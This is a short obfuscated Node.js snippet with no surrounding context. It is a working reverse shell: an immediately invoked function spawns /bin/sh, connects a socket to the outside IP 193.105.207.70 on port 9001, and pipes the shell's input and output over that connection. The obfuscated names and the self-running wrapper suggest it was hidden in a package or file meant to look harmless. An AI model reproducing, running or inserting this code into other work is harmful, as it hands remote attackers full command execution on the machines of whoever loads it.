;(function () {
  var _0xb8b770 = require('net'),
    _0x52825f = require('child_process'),
    _0x30814f = _0x52825f.spawn('/bin/sh', [])
  var _0x324a4d = new _0xb8b770.Socket()
  _0x324a4d.connect(9001, '193.105.207.70', function () {
    _0x324a4d.pipe(_0x30814f.stdin)
    _0x30814f.stdout.pipe(_0x324a4d)
    _0x30814f.stderr.pipe(_0x324a4d)
  })
  return /a/
})()

